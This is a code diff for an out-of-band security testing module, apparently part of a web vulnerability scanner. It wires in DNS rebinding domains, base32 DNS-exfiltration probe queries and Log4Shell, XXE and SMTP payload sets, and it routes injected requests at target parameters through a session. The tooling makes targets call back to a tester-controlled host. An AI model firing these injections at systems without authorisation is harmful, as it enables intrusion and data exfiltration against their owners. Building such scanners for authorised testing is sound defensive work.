@@ -448,25 +448,37 @@ class CollaboratorClient(_BaseOSAT, IOSATClient):
 def create_osat_client(cfg: OSATConfig) -> IOSATClient:
     p = (cfg.provider or "generic").strip().lower()
     if p == "interactsh": return InteractshClient(cfg)
-    if p == "collaborator": return CollaboratorClient(cfg)
+    if p in ("collaborator", "burp"): return CollaboratorClient(cfg)
+    if p in ("enhanced_collaborator", "burp_pro", "oast_pro"):
+        # EnhancedCollaboratorClient is defined later in this module; resolve lazily
+        _cls = globals().get("EnhancedCollaboratorClient")
+        if _cls is not None:
+            return _cls(cfg)
     return GenericOSATClient(cfg)
 
 # =========================== Sync Wrapper ===========================
 
 class OASTClient:
-    def __init__(self, session, cfg_dict: dict | None = None):
+    def __init__(self, session=None, cfg_dict: dict | None = None):
         self.cfg = OSATConfig.from_dict(cfg_dict or {})
         self._client: IOSATClient = create_osat_client(self.cfg)
-    
+
     def register(self): return {"ok": True}
-    
+
+    def get_host(self) -> str:
+        """Return the OOB domain root for payload injection.
+        Falls back to a recognisable placeholder when no domain is configured.
+        """
+        root = self.cfg.root_domain or self.cfg.dns_domain or ""
+        return root.strip(".") if root else "oast.example.com"
+
     def build_url(self, handle=None, tag: str = "") -> str:
         return token_url(f"https://{self.cfg.root_domain}", gen_token(self.cfg.payload_prefix))
 
     def poll(self, handle) -> dict:
         tokens = handle.get("tokens", []) if isinstance(handle, dict) else list(handle or [])
         return {"events": poll_events_sync(self._client, tokens)}
-    
+
     @property
     def iosat(self) -> IOSATClient: return self._client
 
@@ -515,17 +527,26 @@ def run_oast_on_target(
     tokens = []
     attempted = []
     
+    # Use passed-in session for target-facing requests (SmartSession circuit-breaker/rate-limit)
+    _effective_session = session if session is not None else _req.Session()
+
     async def _async_inject():
         for k in params:
             tok = await client.new_token()
             tokens.append(tok)
             plds = client.payloads_for(tok)
             vals = (plds.get("http", []) + plds.get("dns", []))[:max_per_loc]
-            
+
             for val in vals:
                 inj_url = inject_query(url, k, val)
                 try:
-                    _req.get(inj_url, headers=(headers or None), cookies=(cookies or None), timeout=6, verify=True)
+                    _effective_session.get(
+                        inj_url,
+                        headers=(headers or None),
+                        cookies=(cookies or None),
+                        timeout=6,
+                        verify=True,
+                    )
                     attempted.append({"url": url, "param": k, "injected": val, "oast_token": tok})
                 except Exception as exc:
                     _logger.debug("[oast] Suppressed exception: %r", exc)
@@ -868,9 +889,16 @@ class OASTMultiProtocolProber:
         self._ldap = OASTLDAPChannel(self.oob_domain)
 
     def all_payloads(self, token: str) -> Dict[str, List[str]]:
-        """Returns all protocol payloads keyed by protocol name."""
+        """Returns all protocol payloads keyed by protocol name.
+
+        Includes DNS/HTTP/SMTP/FTP/LDAP/Log4Shell payloads plus:
+        - dns_rebinding: rbndr.us and 1u.ms alternating-DNS attack domains
+          (via DNSRebindingAttacker)
+        - dns_exfil: base32-encoded probe chunks for OOB data exfiltration
+          (via OASTDataExfiltrator)
+        """
         host = f"{token}.{self.oob_domain}"
-        return {
+        payloads: Dict[str, List[str]] = {
             "dns": [host],
             "http": [f"http://{host}/", f"https://{host}/"],
             "smtp": self._smtp.smtp_injection_payloads(token),
@@ -879,6 +907,27 @@ class OASTMultiProtocolProber:
             "log4shell": self._ldap.log4shell_payloads(token),
             "xxe_ftp": [self._ftp.xxe_entity(token)],
         }
+
+        # DNS rebinding payloads (DNSRebindingAttacker — defined later in this module)
+        _dns_rb_cls = globals().get("DNSRebindingAttacker")
+        if _dns_rb_cls is not None:
+            try:
+                _rb = _dns_rb_cls(attacker_ip="", target_ip="127.0.0.1")
+                payloads["dns_rebinding"] = [_rb.rbndr_us_domain(), _rb.one_u_ms_domain()]
+            except Exception:
+                pass
+
+        # DNS exfil probe queries (OASTDataExfiltrator — defined later in this module)
+        _exfil_cls = globals().get("OASTDataExfiltrator")
+        if _exfil_cls is not None and self.oob_domain:
+            try:
+                _exfil = _exfil_cls(self.oob_domain, encoding="base32")
+                probe = f"oast-probe:{token}".encode("utf-8")
+                payloads["dns_exfil"] = _exfil.build_dns_exfil_queries(probe, token)[:3]
+            except Exception:
+                pass
+
+        return payloads
 
     def inject_header(self, url: str, token: str) -> List[Dict[str, Any]]:
         """Inject OOB payloads into common HTTP headers."""
@@ -929,13 +978,16 @@ class OASTCorrelationEngine:
     Maps injection tokens -> (payload, endpoint, param, inject_ts)
     and correlates with OAST callback events to produce confirmed findings.
 
-    Provides timing analysis: latency between injection and callback.
+    Provides timing analysis: latency between injection and callback via
+    OASTTimingAnalyzer (statistical aggregation of per-protocol latencies).
     """
 
     def __init__(self):
         self._injections: Dict[str, Dict[str, Any]] = {}
         self._events: List[Dict[str, Any]] = []
         self._lock = threading.Lock()
+        # OASTTimingAnalyzer — initialized lazily (defined later in this module)
+        self._timing: Optional[Any] = None
 
     # -- Registration API --
 
@@ -986,6 +1038,21 @@ class OASTCorrelationEngine:
             callback_ts = time.time()
             inject_ts = injection.get("inject_ts", callback_ts)
             latency_ms = round((callback_ts - inject_ts) * 1000, 1)
+            protocol_detected = event.get("protocol", injection.get("protocol", "unknown"))
+
+            # Record timing via OASTTimingAnalyzer (lazy init — class defined later in module)
+            if self._timing is None:
+                _ta_cls = globals().get("OASTTimingAnalyzer")
+                if _ta_cls is not None:
+                    self._timing = _ta_cls()
+            if self._timing is not None:
+                try:
+                    self._timing.record(
+                        tok, inject_ts=inject_ts, callback_ts=callback_ts,
+                        protocol=protocol_detected,
+                    )
+                except Exception:
+                    pass
 
             finding = {
                 **injection,
@@ -993,7 +1060,7 @@ class OASTCorrelationEngine:
                 "oast_event": event,
                 "callback_ts": callback_ts,
                 "latency_ms": latency_ms,
-                "protocol_detected": event.get("protocol", injection.get("protocol", "unknown")),
+                "protocol_detected": protocol_detected,
                 "remote_address": event.get("remote-address", event.get("remote_address", "")),
                 "severity": "High",
                 "confidence": 1.0,
@@ -1017,7 +1084,7 @@ class OASTCorrelationEngine:
 
     def summary(self) -> Dict[str, Any]:
         with self._lock:
-            return {
+            base = {
                 "injections_total": len(self._injections),
                 "callbacks_received": len(self._events),
                 "avg_latency_ms": (
@@ -1025,6 +1092,13 @@ class OASTCorrelationEngine:
                     if self._events else None
                 ),
             }
+            # Include OASTTimingAnalyzer statistical breakdown if available
+            if self._timing is not None:
+                try:
+                    base["timing_analysis"] = self._timing.analyze()
+                except Exception:
+                    pass
+            return base
 
 
 # ---------------------------------------------------------------------------
